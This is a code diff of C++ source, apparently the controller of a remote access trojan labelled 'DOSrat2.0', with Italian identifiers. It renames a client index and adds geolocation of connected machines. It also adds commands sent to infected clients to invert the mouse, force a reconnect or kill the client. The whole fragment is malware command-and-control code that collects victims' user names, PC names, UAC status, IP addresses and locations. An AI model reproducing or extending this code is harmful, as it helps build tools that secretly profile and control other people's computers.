@@ -10,10 +10,9 @@ private:
 	}
 
 public:
-	static void Inizializzazione(int Index, SOCKET Sock)
+	static void Inizializzazione(int ID, SOCKET Sock)
 	{
 		char Pass[10]; // DOSrat2.0
-		IPinfo GeoIP;
 
 		TcpIP::SetTimeout(10000, Sock);
 
@@ -37,31 +36,53 @@ public:
 
 		json data = json::parse(TcpIP::RecvString(Sock));
 
-		Clients[Index].IsConnected = true;
-		Clients[Index].info.InstallPath = data["InstallPath"];
-		Clients[Index].info.OS = data["OS"];
-		Clients[Index].info.PCname = data["PCname"];
-		Clients[Index].info.UAC = data["UAC"];
-		Clients[Index].info.UserName = data["UserName"];
-		Clients[Index].info.Versione = data["Versione"];
+		Clients[ID].IsConnected = true;
+		Clients[ID].info.InstallPath = data["InstallPath"];
+		Clients[ID].info.OS = data["OS"];
+		Clients[ID].info.PCname = data["PCname"];
+		Clients[ID].info.UAC = data["UAC"];
+		Clients[ID].info.UserName = data["UserName"];
+		Clients[ID].info.Versione = data["Versione"];
 
-		Clients[Index].info.IP = TcpIP::GetIP(Sock);
-		Clients[Index].info.Nazione = (IPlocation::GetInfoFromIP(Clients[Index].info.IP, GeoIP) == 0) ? GeoIP.CountryCode : "";
+		Clients[ID].info.IP = TcpIP::GetIP(Sock);
+		IPlocation::GetInfoFromIP(Clients[ID].info.IP, Clients[ID].info.Location);
 
-		Clu->AggiornaCount();
 		Clu->AggiornaTitolo();
 	}
 
 	static json GetInfo(SOCKET Sock)
 	{
 		string Buff;
+		json j;
 
 		TcpIP::SendString(Sock, "getinfo");
 
 		Buff = TcpIP::RecvString(Sock);
 
-		json j = json::parse(Buff);
+		if(Buff != "")
+			j = json::parse(Buff);
 
 		return j;
+	}
+
+	static string InvertMouse(SOCKET Sock)
+	{
+		string Buff;
+
+		TcpIP::SendString(Sock, "invertmouse");
+
+		Buff = TcpIP::RecvString(Sock);
+
+		return Buff;
+	}
+
+	static bool Reconnect(SOCKET Sock)
+	{
+		return TcpIP::SendString(Sock, "reconnect");
+	}
+
+	static bool KillClient(SOCKET Sock)
+	{
+		return TcpIP::SendString(Sock, "kill");
 	}
 };
